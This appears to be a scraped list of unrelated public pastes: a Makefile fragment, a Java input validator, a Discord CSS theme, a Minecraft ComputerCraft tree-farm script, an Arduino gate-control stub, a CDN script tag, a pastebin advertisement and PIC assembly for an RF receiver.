	$(CORE_DIR)/src/osdep/gui/ShowHelp.cpp \
	$(CORE_DIR)/src/osdep/gui/ShowMessage.cpp \
	$(CORE_DIR)/src/osdep/gui/ShowDiskInfo.cpp \
	$(CORE_DIR)/src/osdep/gui/SelectFolder.cpp \
	$(CORE_DIR)/src/osdep/gui/SelectFile.cpp \
	$(CORE_DIR)/src/osdep/gui/CreateFilesysHardfile.cpp \
	$(CORE_DIR)/src/osdep/gui/EditFilesysVirtual.cpp \
	$(CORE_DIR)/src/osdep/gui/EditFilesysHardfile.cpp \
	$(CORE_DIR)/src/osdep/gui/EditFilesysHardDrive.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelAbout.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelPaths.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelQuickstart.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelConfig.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelCPU.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelChipset.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelCustom.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelROM.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelRAM.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelFloppy.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelExpansions.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelHD.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelRTG.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelHWInfo.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelInput.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelIOPorts.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelDisplay.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelSound.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelDiskSwapper.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelMisc.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelPrio.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelSavestate.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelVirtualKeyboard.cpp \
	$(CORE_DIR)/src/osdep/gui/PanelWHDLoad.cpp \
	$(CORE_DIR)/src/osdep/gui/main_window.cpp \
	$(CORE_DIR)/src/osdep/gui/Navigation.cpp \
	$(CORE_DIR)/src/osdep/vkbd/vkbd.cpp \
	$(CORE_DIR)/src/newcpu.cpp \
	$(CORE_DIR)/src/newcpu_common.cpp \
	$(CORE_DIR)/src/readcpu.cpp \
	$(CORE_DIR)/src/cpudefs.cpp \
	$(CORE_DIR)/src/cpustbl.cpp \
	$(CORE_DIR)/src/cpuemu_0.cpp \
	$(CORE_DIR)/src/cpuemu_4.cpp \
	$(CORE_DIR)/src/cpuemu_11.cpp \
	$(CORE_DIR)/src/cpuemu_13.cpp \
	$(CORE_DIR)/src/cpuemu_40.cpp \
	$(CORE_DIR)/src/cpuemu_44.cpp

include ../common.mak"
vRChZmgm,Untitled,SenpaiZero,Java,Thursday 9th of May 2024 03:14:00 AM CDT,"import java.util.Scanner;

public class Main {
	public static void main(String[] args) {
		String user;
		Scanner scanner = new Scanner(System.in);
		do {
			System.out.print(""Student Number: "");
			user = scanner.nextLine();
			
			if(user.matches(""[0-9]{4}-[0-9]{2}-[0-9]{3}""))
				break;
			
			System.out.println(""Invalid student number."");
		} while(true);
		
		System.out.println(""Your student number is "" + user);
	}
}
"
NSMAQyVF,Untitled,bad_dev,CSS,Thursday 9th of May 2024 02:57:43 AM CDT,"/* 
 * Yes, this codebase is near unreadable. Why?
 * I designed this mainly as a test to see how viable avoidance of straight out class selectors would be.
 * The codebase was never designed to be pretty, it was designed to require as little maintenance as possible.
 */

@import url('https://fonts.googleapis.com/css2?family=Karla:wght@400;500;600;700&display=swap');
@import url('https://mwittrien.github.io/BetterDiscordAddons/Themes/BlurpleRecolor/BlurpleRecolor.css');
@import url('https://discord-custom-covers.github.io/usrbg/dist/usrbg.css');

button {
	--accentcolor: var(--accent-alt);
}


/* Root Variables */

:root {
	--font-primary: 'Segoe UI', sans-serif;
	--font-display: var(--font-primary) !important;
	/* Dark Matter Variables */
	--avatar-size: 32px;
	--background-image: url('https://i.imgur.com/7SbtKvw.png');
	--home-image: url('https://i.imgur.com/233d55Y.gif');
	--background-solid: #161921;
	--background-solid-dark: #101218;
	--background-solid-darker: #0c0e12;
	--accent: 37, 172, 232;
	--accent-alt: 29, 101, 134;
	--md-black: 0, 0, 0;
	--dm-white: 255, 255, 255;
	/* BlurpleRecolor */
	--accentcolor: var(--accent);
	--vaccentcolor-hover: rgb(var(--accent));
	--vaccentcolor-active: rgb(var(--accent));
}

:not(div[class*=""userProfile""][class*=""unThemed""]).theme-dark,
:not(div[class*=""userProfile""]).theme-light,
div[class*=""userProfile""][class*=""unThemed""].theme-light {
	/* Discord vars */
	--background-primary: var(--background-solid);
	--background-mobile-primary: var(--background-primary);
	--background-secondary: var(--background-solid);
	--background-mobile-secondary: var(--background-secondary);
	--background-secondary-alt: var(--background-solid);
	--background-tertiary: var(--background-solid);
	--background-floating: var(--background-solid);
	--background-secondary: var(--background-solid);
	--background-accent: var(--background-solid);
	--background-message-hover: rgba(var(--md-black), 0.4);
	--channeltextarea-background: transparent;
	--activity-card-background: rgba(var(--dm-white), 0.05);
	--deprecated-store-bg: transparent;
	--background-modifier-hover: rgba(var(--md-black), 0.3);
	--background-modifier-active: rgba(var(--md-black), 0.3);
	--background-modifier-selected: rgba(var(--md-black), 0.6);
	--elevation-low: inset 0 -1px 0 0 rgba(var(--md-black), 0.3);
	--channels-default: rgba(var(--dm-white), 0.3);
	--deprecated-quickswitcher-input-background: var(--background-solid);
	--header-primary: rgba(var(--dm-white), 1);
	--header-secondary: rgba(var(--dm-white), 0.6);
	--text-normal: rgba(var(--dm-white), 0.6);
	--text-muted: #8a8e94;
	--interactive-muted: rgba(var(--dm-white), 0.15);
	--interactive-normal: rgba(var(--dm-white), 0.5);
	--interactive-hover: rgba(var(--dm-white), 0.75);
	--interactive-active: rgba(var(--dm-white), 1);
	--deprecated-card-bg: rgba(var(--dm-white), 0.05);
	--text-link: rgba(var(--accent), 1);
	--focus-primary: rgba(var(--accent), 1);
    --modal-background: var(--background-solid);
    --modal-footer-background: var(--background-solid-darker);
}

::selection {
	background-color: rgba(var(--accent-alt), 0.5);
}


/* Scrollbars */

::-webkit-scrollbar {
	width: 14px !important;
}

 ::-webkit-scrollbar-thumb {
	border-radius: 8px !important;
	border: 3px solid transparent !important;
	background-color: rgba(var(--accent-alt), 1) !important;
}

 ::-webkit-scrollbar-track {
	visibility: visible !important;
	border-radius: 8px !important;
	border: 3px solid transparent !important;
	background-color: rgba(0, 0, 0, 0.3) !important;
	background-clip: padding-box !important;
}

.none-2Eo-qx::-webkit-scrollbar {
	display: none !important;
}


/* Titlebar */

div[class*=""typeWindows-""] {
	--background-modifier-hover: rgba(var(--dm-white), 0.05);
	--background-modifier-active: rgba(var(--dm-white), 0.075);
	height: 26px;
}

div[class*=""typeWindows-""]>div:first-child {
	display: none;
}

div[class*=""typeWindows-""]>div[role=""button""] {
	height: 30px;
	width: 36px;
}

div[class*=""typeWindows-""]::after {
	content: 'Discord';
	font-weight: 7500;
	line-height: 31px;
	color: var(--text-muted);
	font-size: 14px;
	position: absolute;
	padding: 0 12px;
	top: 0;
	left: 0;
	width: 100%;
	height: 30px;
	background: rgba(var(--md-black), 0.85);
	z-index: -1;
}


/* Guilds */

nav[class*=""guilds-""] {
    background: transparent;
}
ul[data-list-id='guildsnav'] {
	--background-secondary: var(--background-solid);
    	--background-primary: rgba(var(--dm-white), 0.1);
	margin-bottom: 70px;
	background-color: rgba(var(--md-black), 0.6);
	border-right: 1px solid rgba(var(--md-black), 0.2);
	box-shadow: inset -10px 0px 20px -10px rgba(var(--md-black), 0.3);
}

ul[data-list-id='guildsnav'] ::-webkit-scrollbar {
	display: none;
}

ul[data-list-id='guildsnav']>div[dir] {
	padding-top: 18px;
}

ul[data-list-id='guildsnav'] [class^=""pill-""],
ul[data-list-id='guildsnav'] [class^=""pill-""]>div {
	height: 40px !important;
}

ul[data-list-id='guildsnav'] div[style*=""height: 56""],
ul[id^=""folder-items-""] {
	height: auto !important;
}

ul[data-list-id='guildsnav'] [class^=""pill-""] span {
	width: 10px;
	margin-left: -5px;
	border-radius: 20px;
}

[data-list-id='guildsnav'] [class^=""pill-""] span[style^=""opacity: 1; height: 40""] {
	--header-primary: rgba(var(--accent), 1);
}

span[class^=""expandedFolderBackground-""] {
	--background-secondary: rgba(var(--md-black), 0.25);
	border-radius: 14px;
	width: 40px;
	left: 16px;
}

.wrapper-28eC3z,
[data-list-id='guildsnav'] [data-dnd-name] > div,
[data-list-id='guildsnav'] svg[width=""48""] {
	width: 40px;
	height: 40px;
}

div[data-list-item-id=""guildsnav___home""] {
	background: var(--home-image) top center/110% no-repeat;
}

div[class^=""unreadMentionsIndicatorBottom-""] {
	bottom: 70px;
}

#app-mount [data-list-item-id=""guildsnav___home""]>div {
	color: transparent;
	background-color: transparent;
}

div[data-list-item-id=""guildsnav___create-join-button""],
div[data-list-item-id=""guildsnav___guild-discover-button""] {
	transition: 150ms ease;
	opacity: 0.5;
	background-color: var(--background-solid) !important;
	color: rgba(var(--dm-white), 0.3) !important;
	border: 1px dashed rgba(var(--dm-white), 0.3);
	border-radius: 50px;
}

div[data-list-item-id=""guildsnav___create-join-button""]:hover,
div[data-list-item-id=""guildsnav___guild-discover-button""]:hover {
	opacity: 1;
}


/* Sidebar */

.platform-win [class^=""sidebar-""] {
	border-radius: 0;
    background-color: transparent;
}

div[class^=""sidebar-""] nav,
#private-channels {
	background: var(--background-secondary) !important;
	--background-tertiary: rgba(var(--md-black), 0.35);
}

div[class^=""sidebar-""]>nav>div[class^=""searchBar""] {
	height: 54px;
}

/* members wrapper */
.container-2o3qEW {
	--background-secondary: rgba(var(--md-black), 0.4);
	--background-modifier-hover: rgba(var(--dm-white), 0.07);
	--background-modifier-active: var(--background-modifier-hover);
	--background-modifier-selected: rgba(var(--dm-white), 0.07);
    background: rgb(var(--md-black), 0.9);
}

div[data-list-id^=""members-""][class*=""scrollerBase-""] {
    background: transparent;
}

div[data-list-id^=""members-""] [class*=""placeholder""] {
	--backgorund-primary: var(--text-normal);
}

div[class^='nowPlayingColumn'] {
	--background-secondary: transparent;
	--background-primary: rgba(var(--md-black), 0.5);
	--background-modifier-hover: rgba(var(--dm-white), 0.075);
}
div[class^=""members-""] div[class^=""member-""] {
    background-color: transparent;
}

#channels div[class^=""unread-""] {
	--interactive-active: rgba(var(--accent), 1);
}


/* Sidebar Header */

nav[aria-label]>div>header {
	display: flex;
	flex-direction: column;
	justify-content: center;
	height: 54px;
	--background-accent: rgba(var(--accent), 1);
	--background-modifier-hover: rgba(var(--md-black), 0.25);
}


/* Outer containers */

body {
	background: var(--background-image) center/cover no-repeat;
}

#app-mount {
    background-color: transparent;
	--background-tertiary: transparent;
	--background-secondary: transparent;
}

#app-mount>div[class^=""appDevToolsWrapper-""] {
	--background-primary: transparent;
	--background-tertiary: transparent;
	--background-secondary: rgba(var(--md-black), 0.7);
	background-color: rgba(var(--md-black), 0.4);
}
div[class^=""notAppAsidePanel-""]>div[class^=""app-""]>div[class^=""app-""],
div[class^=""app-""]>div[class^=""bg-""] {
    background-color: transparent;
}
div[class*=""baseLayer-""]>div[class^=""container-""] {
    background-color: rgb(var(--md-black), 0.4);
}

nav+div [class^='sidebar-'],
nav+div[class^='base-'] {
	overflow: visible !important;
	position: relative;
	max-width: calc(100% - 72px);
}

nav+div[class^='base-'] > div[class^=""notice""] {
	border-radius: 0;
}

div[class^='base-']>div,
section[class*=""themed-""] {
	--background-secondary: rgba(var(--md-black), 0.7);
	--background-tertiary: rgba(var(--dm-white), 0.05);
	--background-primary: rgba(var(--md-black), 0.8);
}

#app-mount>div:not([class^=""appDevToolsWrapper-""]),
.autocomplete-1vrmpx {
	--background-primary: var(--background-solid);
	--background-secondary: var(--background-solid-dark);
	--background-secondary-alt: var(--background-solid-darker);
	--background-tertiary: var(--background-solid-darker);
}


/* Header */

section[class*=""themed-""] {
	height: 54px;
	box-shadow: var(--elevation-low);
    background-color: rgb(var(--md-black), 0.925) !important;
	--background-secondary: rgba(var(--dm-white), 0.1);
}

section>div>a[href*=""support.discord.com""] {
	display: none;
}

section[class*=""themed-""]::before,
section[class*=""themed-""] ::after {
	content: none;
}

section div[class^=""toolbar""]>div[role] {
	margin: 0 4px;
	transition: 150ms ease;
	display: flex;
	align-items: center;
	justify-content: center;
	border-radius: 3px;
	width: 28px;
	height: 28px;
}

section div[class^=""toolbar""]>div[role] svg {
	width: 22px;
}

section div[class^=""toolbar""]>div[role][class*=""selected-""] {
	background-color: rgba(var(--dm-white), 0.1);
}


/* Panels */

div[class^='sidebar-']>section {
	--background-primary: rgba(var(--dm-white), 0.07);
	--background-secondary: rgba(var(--dm-white), 0.1);
	--background-secondary-alt: rgba(var(--md-black), 0.95);
	margin-bottom: 70px;
}

div[class^='sidebar-']>section>div:last-child {
	background-color: var(--background-secondary-alt);
	box-sizing: border-box;
	height: 70px;
	padding: 0 18px;
	width: calc(100% + 72px);
	position: absolute;
	left: -72px;
	bottom: 0;
}
div[class^=""sidebar-""]>section>div:last-child [class^=""avatarWrapper-""] {
    flex: 1;
}


/* Content */

div[class^='chat'] {
	--background-floating: rgba(var(--md-black), 0.5);
    background: transparent;
}

div[class^=""container-""][id^=""chat-messages-""] {
	--background-modifier-hover: var(--background-solid-dark);
}

div[class^='chat'] main form {
	margin-top: 0;
}

div[class^='chat'] main form::before {
	content: none;
}

div[data-list-id=""chat-messages""] {
	--background-primary: transparent;
	--background-secondary: rgba(var(--dm-white), 0.05);
	--background-accent: rgba(var(--dm-white), 0.1);
}

div[class^=""channelTextArea-""] {
	--background-secondary: transparent;
	box-shadow: inset 0 0 0 2px rgba(var(--dm-white), 0.1);
	transition: 250ms ease;
	margin-bottom: 24px;
	margin-top: 12px;
	border-radius: 5px;
}

div[id^=""chat-messages-""]+div:not([id]):last-child {
	height: 8px;
}

div[id^=""chat-messages-""][class*=""cozy-""] {
	padding-left: calc(var(--avatar-size) * 2);
}

div[id^=""chat-messages-""] {
	margin-left: 8px;
	margin-right: 8px;
	border-radius: 4px;
}

div[id^=""chat-messages-""]>div[class^=""buttonContainer-""] {
	transform: scale(.85);
	top: 1px;
}

div[id^=""chat-messages-""] {
	--background-primary: rgba(var(--md-black), 0.5);
}

div[id^=""chat-messages-""]>div>[class^=""avatar-""] {
	margin-top: 6px;
	width: var(--avatar-size);
	height: var(--avatar-size);
}

div[id^=""chat-messages-""][class*=""cozy-""] div::before {
	--gutter: 13px;
}

.mention {
	transition: 150ms ease;
	color: rgba(var(--accent), 1) !important;
	background-color: rgba(var(--accent), 0.3);
	padding: 3px 5px;
	border-radius: 5px;
}

.mention:hover {
	background-color: rgba(var(--accent), 0.3) !important;
}

#app-mount .container-2cd8Mz {
	background: var(--background-primary);
}

div[class*=""barBase-""] {
	padding-bottom: 0;
	background-color: rgba(var(--accent-alt), 0.9);
}


/* Codeblocks */

html pre {
	border-radius: 0;
	background: transparent;
	border-color: rgba(255, 255, 255, 0.1);
}

pre code.hljs {
	border: none;
	background-color: rgba(var(--dm-white), 0.1);
	color: rgba(var(--dm-white), 0.7);
	padding: 1em;
}

html code.inline,
html code.inline {
	background: rgba(var(--dm-white), 0.1);
	color: rgba(var(--dm-white), 0.7);
	padding: 0.3em 0.6em;
	border-radius: 3px;
}


/* Settings */

div[aria-label*=""_SETTINGS""],
div[aria-label*=""_DEBUG""] {
	--background-primary: transparent;
	--background-secondary: rgba(var(--md-black), 0.7);
}

div[class^=""sidebarRegionScroller-""]>nav {
	--background-secondary: transparent;
}

div[class^=""contentRegion-""] {
	--background-primary: rgba(var(--md-black), 0.8);
}

div[class^=""contentRegion-""] div[style^=""overflow: hidden scroll""] {
	background-color: transparent;
	--background-primary: rgba(var(--md-black), 0.1);
	--background-secondary: rgba(var(--md-black), 0.2);
	--background-secondary-alt: rgba(var(--md-black), 0.25);
	--background-tertiary: rgba(var(--dm-white), 0.1);
}

div[aria-label*=""_SETTINGS""] aside>div {
	--background-primary: transparent;
}

div[aria-label*=""_SETTINGS""] aside>div::-webkit-scrollbar-track {
	visibility: hidden !important;
}

.bd-addon-list {
	--background-secondary: var(--background-solid);
	--background-secondary-alt: var(--background-solid-dark);
}


/* Tab Bar */

div[class*=""topPill""],
nav>div[role=""tablist""],
.bd-tab-bar {
	--background-accent: rgba(var(--accent));
	--background-modifier-hover: rgba(var(--dm-white), 0.05);
	--background-modifier-active: rgba(var(--dm-white), 0.075);
	--background-modifier-selected: rgba(var(--accent), 0.25);
}


/* Server Discovery */

div[class^=""sidebar""]+[class^=""pageWrapper""] {
	--background-secondary: rgba(var(--md-black), 0.8);
	background-color: var(--background-secondary);
}


/* Crash Page */

div[class*=""errorPage""] {
	--background-secondary: rgba(var(--md-black), 0.7) !important;
}


/* Tooltips */

div[class^=""tooltip-""] {
	--background-floating: rgba(var(--accent-alt), 1);
	--text-normal: #e0e0e0;
}


/* Buttons */

button[class*=""button-""][class*=""color""],
.bd-button {
	--vaccentcolor: var(--accent-alt);
}

.bd-button {
	--bd-blue: rgba(var(--accent-alt), 1);
}


/* Context Menu */

div[role=""menuitem""] {
	--vaccentcolor: var(--accent-alt);
}

div[role=""menuitem""]:active {
	--vaccentcolor: var(--accent);
}


/* Depreceated Components */


/* These use hardcoded colors, no need to bother with strange selectors */

#app-mount .footer-2gL1pp,
#app-mount .footer-3mqk7D {
	background-color: var(--background-secondary);
	box-shadow: none;
}

#app-mount .root-1gCeng,
#app-mount .addGamePopout-2RY8Ju,
#app-mount .keyboardShortcutsModal-3piNz7,
#app-mount .emojiAliasInput-1y-NBz .emojiInput-1aLNse,
.perksModal-fSYqOq .perk-2WeBWW,
#app-mount .uploadModal-2ifh8j,
#app-mount .contentWrapper-3WC1ID,
#app-mount .contentWarningPopout-n5JsIs {
	background-color: var(--background-primary);
}

#app-mount .codeRedemptionRedirect-1wVR4b,
#app-mount .userSettingsVoice-iwdUCU .previewOverlay-2O7_KC,
#app-mount .inset-3sAvek {
	background-color: var(--background-tertiary);
	border: none;
}

#app-mount .paymentPane-3bwJ6A,
#app-mount .tierBody-x9kBBp,
#app-mount .tierBody-16Chc9,
#app-mount .barBackground-2EEiLw,
#app-mount .body-3iLsc4,
#app-mount .footer-1fjuF6,
#app-mount .container-3ayLPN,
#app-mount .colorPickerCustom-2CWBn2,
#app-mount .tierMarkerBackground-3q29am,
.css-3vaxre-menu,
.css-dwar6a-menu,
#app-mount .autocomplete-1vrmpx,
.categoryHeader-O1zU94,
#app-mount .popoutList-T9CKZQ,
#app-mount .quickSelectPopout-X1hvgV,
.colorable-1bkp8v.primaryDark-3mSFDl,
.tile-2naSqK,
.videoWrapper-2v09vt,
#app-mount .spoilerText-3p6IlD.hidden-HHr2R9 {
	background-color: var(--background-solid);
}

#app-mount .expandedInfo-3kfShd,
#app-mount .tierHeaderLocked-1a2opw,
#app-mount .tierHeaderLocked-1s2JJz,
#app-mount .headerNormal-T_seeN,
#app-mount .focused-2bY0OD,
.colorable-1bkp8v.primaryDark-3mSFDl:hover {
	background-color: var(--background-solid-dark);
}

#app-mount .payment-xT17Mq {
	background-color: transparent;
	border-bottom-color: rgba(var(--dm-white), 0.025);
}

#app-mount .bottomDivider-1K9Gao,
#app-mount .focused-2bY0OD {
	border-bottom-color: var(--background-solid-dark);
}

#app-mount div[data-list-id=""billing-history""],
#app-mount div[data-list-id^=""private-channels-""],
#app-mount .media-engine-video,
.react-datepicker,
.react-datepicker__header,
.react-datepicker__day--outside-month,
.react-datepicker__day--disabled,
div[data-list-id^=""members-""],
div[data-list-id^=""members-""]>div {
	background-color: transparent !important;
}

.react-datepicker__day--disabled {
	opacity: .6;
}

#app-mount .react-datepicker__day {
	border-top-color: var(--background-secondary);
	border-left-color: var(--background-secondary);
}

#app-mount .background-3xPPFc,
#app-mount .tierInProgress-3mBoXq {
	color: var(--background-solid);
}

.option-96V44q:after {
	content: none;
}

#app-mount .option-96V44q.selected-rZcOL-,
#app-mount .selected-1Tbx07,
#app-mount .quickSelectPopoutOption-opKBx9:hover,
#app-mount .outer-1AjyKL.active-1xchHY,
#app-mount .outer-1AjyKL.interactive-3B9GmY:hover {
	background-color: var(--background-modifier-hover);
}

.css-3vaxre-menu,
.tierMarker-5HkGJ_[style] {
	border-color: rgba(var(--dm-white), 0.025) !important;
}

#app-mount .searchAnswer-3Dz2-q,
#app-mount .searchFilter-2ESiM3,
#app-mount .option-1B5ZV8,
#app-mount .pill-2pQByF {
	background-color: rgba(var(--accent-alt), 1);
	color: #fff;
}

#app-mount .keybindShortcut-1BD6Z1 span {
	background: var(--background-solid-dark);
	box-shadow: inset 0 -4px 0 var(--background-solid-darker);
}

#app-mount .perksModal-fSYqOq {
	background: rgba(var(--md-black), 0.7);
}

#app-mount .card-FDVird:before {
	background: var(--background-modifier-hover);
	border: none;
}


/* Login Page */

div[class^=""splashBackground""] canvas,
div[class^=""splashBackground""] img {
	display: none;
}

/* Modals */

div[class*=""footerSeparator""] {
	box-shadow: none !important;
}

/* Forums */
.container-3wLKDe {
    background: var(--background-primary);
}
li[class^=""card-""]>div[class^=""container-""] {
    background: var(--background-floating)
}"
cYhddNxz,boom.lua,joppeaa,Lua,Thursday 9th of May 2024 01:56:47 AM CDT,"local State = {INIT = ""1"", 
                WAIT = ""2"", 
                GET_TREE = ""3"", 
                REPLANT = ""4""}
                
local currentState = State.INIT
local treeCNT = 0


disp = peripheral.wrap(""bottom"")

function serialize(data, name)
  if not fs.exists('/data') then
      fs.makeDir('/data')
  end
  local f = fs.open('/data/'..name, 'w')
  f.write(textutils.serialize(data))
  f.close()
end

function unserialize(name)
  if fs.exists('/data/'..name) then
      local f = fs.open('/data/'..name, 'r')
      data = textutils.unserialize(f.readAll())
      f.close()
  end
  return data
end

function getTree()
    turtle.dig()
    turtle.forward()
    while not(turtle.up()) do
        turtle.digUp()
        turtle.up()
    end
    while not (turtle.detectDown()) do
        turtle.down()
    end
    
    turtle.back()
    treeCNT = treeCNT + 1
    disp.clear()
    disp.setCursorPos(1,1)
    disp.write(tostring(treeCNT).."" bomen"")
    serialize(treeCNT, ""memTreeCount"")
    currentState = State.REPLANT
end

function replant()
    turtle.select(3)
    if (turtle.getItemCount() < 10) then
        print(""Running low on Saplings"")
        turtle.suckDown(30)
    end
    turtle.place()   
    currentState = State.WAIT
end

function waitForGrow()
    local inspectedBlock, data = turtle.inspect()
    if data.name == ""minecraft:spruce_log"" then
        currentState = State.GET_TREE
    end
end

while (1) do
    if currentState == State.INIT then
      treeCNT = unserialize(""memTreeCount"")
    end
    
    if currentState == State.WAIT then
        waitForGrow()
    end
    
    if currentState == State.REPLANT then
        replant()        
    end
    
    if currentState == State.GET_TREE then
        getTree()
    end
end



"
ZW7k78wE,EasyButton Control rev_01,pleasedontcode,Arduino,Thursday 9th of May 2024 01:48:05 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: EasyButton Control
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 06:47:24

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* button1 push open the gate, button 2 push close */
	/* the gate, button 3 sensor close the gate, and */
	/* relay to automatic open when button 1 pressed */
	/* button 3 will check and close the gate, when relay */
	/* is trigger button 3 will check and close the gate. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Arduino.h>
#include <EasyButton.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button1_PIN = 1;  // Button 1 pin
const uint8_t button2_PIN = 2;  // Button 2 pin
const uint8_t button3_PIN = 3;  // Button 3 pin

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button1(button1_PIN);
EasyButton button2(button2_PIN);
EasyButton button3(button3_PIN);

void setup(void)
{
    // Initialize button pins
    pinMode(button1_PIN, INPUT_PULLUP);
    pinMode(button2_PIN, INPUT_PULLUP);
    pinMode(button3_PIN, INPUT_PULLUP);

    // Additional setup for gate control
    // Define gate control logic here
}

void loop(void)
{
    // Main code for gate control
    // Implement gate control logic based on button presses
    // Use button.read() to read the button state

    // Example logic:
    if (button1.read()) {
        // Open the gate
        // Implement gate opening logic
    }

    if (button2.read()) {
        // Close the gate
        // Implement gate closing logic
    }

    if (button3.read()) {
        // Sensor to close the gate
        // Implement gate closing logic based on sensor
    }

    // Additional logic for automatic gate opening with relay trigger
    // Check if button 1 is pressed and trigger relay
    // Implement automatic gate opening logic

    // Check and close the gate based on button 3 press
    // Implement gate closing logic based on button 3 press

    // Check and close the gate when relay is triggered
    // Implement gate closing logic when relay is triggered
}

/* END CODE */"
c8jpLVcw,Custom PDF Viewer Block in Articulate Rise JS lib,nrzmalik,JavaScript,Thursday 9th of May 2024 01:13:11 AM CDT,"<script src=""https://cdn.jsdelivr.net/gh/nrzmalik/risePDFviewer/nrzPDF.js"" defer></script>"
PyEMaAFB,Pastebin.ai - #1 pastebin alternative,xxsa,PHP,Thursday 9th of May 2024 01:01:47 AM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
..............
...........................
"
u7zuz1sf,Receptor_RF_433MHz,ericksm,MPASM,Thursday 9th of May 2024 12:16:26 AM CDT," __CONFIG   _CP_OFF &  _WDT_OFF & _PWRTE_ON & _XT_OSC; MCP19110 Configuration Bit Settings
; Assembly source line config statements

 LIST	   P=16F84A
 INCLUDE  <P16F84A.INC>

   ERRORLEVEL -302
   
variables udata_shr 0x0C
cuenta	    res 1	    ; El contador a visualizar.
Count1	    res 1
contador    res 1
datoserie   res 1
R_ContA	    res 1	    ; Contadores para los retardos.
R_ContB	    res 1
R_ContC	    res 1


; ZONA DE CÓDIGOS ********************************************************************

    ORG	    0x00	    ; El programa comienza en la dirección 0.
    goto    Inicio
    org	    0x04
    goto    Timer0_interrupcion
Inicio
    bsf	    STATUS,RP0	    ; Acceso al Banco 1.
    clrf    TRISB	    ; Las líneas del Puerto B se configuran como salida.
    movlw   b'00000001'	    ; Las 4 líneas del Puerto A se configuran como entrada.
    movwf   TRISA
    movlw   b'00000111'
    movwf   OPTION_REG	    ;prescaler a 256   
    bcf	    STATUS,RP0	    ; Acceso al Banco 0.
    clrf    PORTB
Principal
    movlw   0x08
    movwf   cuenta
    movlw   0x04
    movwf   contador
    btfsc   PORTA,0
    goto    Principal
;hay un tiempo aleatorio que debo esperar para obtener el uno del dato star.
EsperoUno
    btfss   PORTA,0
    goto    EsperoUno

;tiempo para reconocer 1 de dato STAR  (5ms)
TiempoUno
    ;se testea en cada momento
    btfss   PORTA,0	    ; sigue siendo 1?
    goto    Fin
    call    Retardo_500micros
    decfsz  cuenta,1
    goto    TiempoUno
    bsf	    PORTB,7	    ; PRUEBASSS
    movlw   0x08
    movwf   cuenta
;tiempo que es cero de dato STAR  (5ms)
    call    Retardo_1ms
TiempoCero
;se testea en cada momento
    call    Retardo_500micros
    btfsc   PORTA,0	    ; sigue siendo 1?
    goto    Fin
    decfsz  cuenta,1
    goto    TiempoCero
    clrf    datoserie
; verifico dato enviado durante 20ms
    call    Retardo_1ms
    movlw   d'14'
    movwf   TMR0	    ; CARGO EL TIMER0
    movlw   b'10100000'    
    movwf   INTCON	    ; AUTORIZO INTERRUPCION DEL TIMER0

LOOPDATOS
    call    Retardo_1ms
    movf    PORTA,0 
    movwf   Count1
    call    Retardo_1ms
    movf    Count1,0 
    subwf   PORTA,0
    btfss   STATUS,2
    goto    Fin
    call    Retardo_1ms
    movf    Count1,0 
    subwf   PORTA,0
    btfss   STATUS,2
    goto    Fin
    bsf     STATUS,0
    btfss   Count1,0 
    bcf     STATUS,0 
    rrf     datoserie,1  
    call    Retardo_2ms
    decfsz  contador,1
    goto    LOOPDATOS
;continua. El swapf es para obtener el verdadero dato     DATO ->  DATOSERIE
;se divide en 2 segmentos de 4 bits, el swapf cambia, luego    (DSERIE1)(DSERIE2)  ->  (DSERIE2)(DSERIE1)
    swapf   datoserie,1
    movf    datoserie,0 
    movwf   PORTB
;espero un tiempo menor a 40ms 
    call    Retardo_10ms
    goto    Principal
Fin
    clrf    PORTB
    goto    Principal
    
;Temporizacion por desbordamiento del Timer0
Timer0_interrupcion	    
    btfss   PORTA,0
    clrf    PORTB
    ;TEST/////////////////////////
    movlw   0x80
    xorwf   PORTB,F
    ;////////////////////////////////
    bcf     INTCON,T0IF
    retfie
;---------------------------------------------


;//////////////// RETARDOS ///////////////////////
;	===================================================================
;	  Del libro ""MICROCONTROLADOR PIC16F84. DESARROLLO DE PROYECTOS""
